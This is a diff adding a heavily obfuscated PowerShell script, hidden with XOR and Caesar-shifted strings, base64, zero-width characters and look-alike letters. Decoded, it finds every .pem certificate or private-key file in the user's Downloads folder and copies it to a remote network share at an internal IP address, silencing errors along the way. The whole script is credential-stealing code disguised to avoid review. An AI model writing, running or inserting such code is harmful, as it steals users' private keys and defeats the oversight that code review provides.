@@ -1,0 +1,21 @@
+$gHfk = & (&($($k3127='l-rF-3^y+ou$T';$b=[byte[]](0x2B,0x48);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3127);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+$($k7626=2;$b=[byte[]](0x76,0x2f,0x41,0x6d,0x6f,0x6f,0x63,0x6c,0x66);-join($b|%{[char]($_-bxor$k7626)}))) ('{0}{1}{2}{3}' -f 'jO?n','-pa','t','h') -CommandType Function, &('Сm'+$(-join('hpix'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] $qI2gFy:usErPRoFile $($k7240='hb23;';$b=[byte[]](0x2C,0x0D,0x45,0x5D,0x57,0x07,0x03,0x56,0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7240);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+
+$fCDlqrOU = (('\\10.3'+'1'+'.12.') + $(-7 * -29) + (-join('\','sha','r','e')))
+
+if (!(& (Get-C`ommand ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Pz9zdA=='))) -CommandType Function, &(('{0}' -f 'Cmdle')+'t') -ErrorAction SilentlyContinue)[0] $fcdLqROU)) {
+    & (&((-join('G','et','-C','o'))+'m‍m‍a​n​d‍') "$([char]0x77)$([char]0x72)$([char]0x69)$([char]0x3F)$([char]0x3F)" -CommandType Function, &('C‌m​d​'+$(-join('exm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] ($($k1931='Q@wkOUSEb';$b=[byte[]](0x02,0x0D,0x35,0x4B,0x3C,0x3D,0x32,0x37,0x07,0x71,0x2E,0x18,0x1F,0x6F,0x34,0x30,0x26,0x07,0x22,0x33,0x1E,0x09,0x23,0x30,0x69,0x65);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1931);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $FCDLQrou)
+    & (&(('{0}{1}{2}' -f 'Get-','C','o')+('{0}' -f 'mmand')) "$([char]0x3F)$([char]0x3F)$([char]0x69)$([char]0x54)" -CommandType Function, &(([string]::Format('{0}','C'))+(-join('m','dl','e','t'))) -ErrorAction SilentlyContinue)[0]
+}
+
+$kAP7pHZ = & (&('G​e‍t​-‍C‍o‍'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bW1hbmQ=')))) 'G‍E​t​-​c​h​I‌?​?​?‌?​?‌?‌' -CommandType Function, &("$([char]0x43)"+'mdlеt') -ErrorAction SilentlyContinue)[0] -PatH $GHFK -Filter $($k2353='8t<s>ZM]-';$b=[byte[]](0x12,0x5A,0x4C,0x16,0x53);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2353);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -fIle -eRRORaCTIon SILEntlycoNTiNue
+
+if ($kaP7pHz.cOunt -eq 0) {
+    & (&('Gеt-Соmm'+('a'+'nd')) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dypl'))) -CommandType Function, &($(-join('Mwnv'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))+('{0}' -f 'et')) -ErrorAction SilentlyContinue)[0] $(-join('Za .bqy ruxqe ragzp uz Paizxampe.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))
+    & (&($(-join('Jhw-'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29tbWFuZA==')))) ([System.Text.Encoding]::UTF8.GetString([byte[]](0x45,0x3F,0x3F,0x54))) -CommandType Function, &('Сmd'+$(-join('qjy'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0]
+}
+
+foreach ($oogpG in $kAP7pHZ) {
+    $qdgEN = & (&($($k2171='oc,u6Jxd';$b=[byte[]](0x28,0x06,0x58,0x58);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2171);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+$(-join('Amkkylb'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))) $(-join('OtnS-????'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0] $fCDlqROu $OOGPg.nAme
+    cp -PAtH $ooGpg.fULlnAME -deSTiNATion $QdGEN -FORCE
+    write (('{0}{1}{2}' -f 'Copie','d',' ') + $($OOgPg.Name) + ('{0}' -f ' to ') + $FCDLQrou)
+}
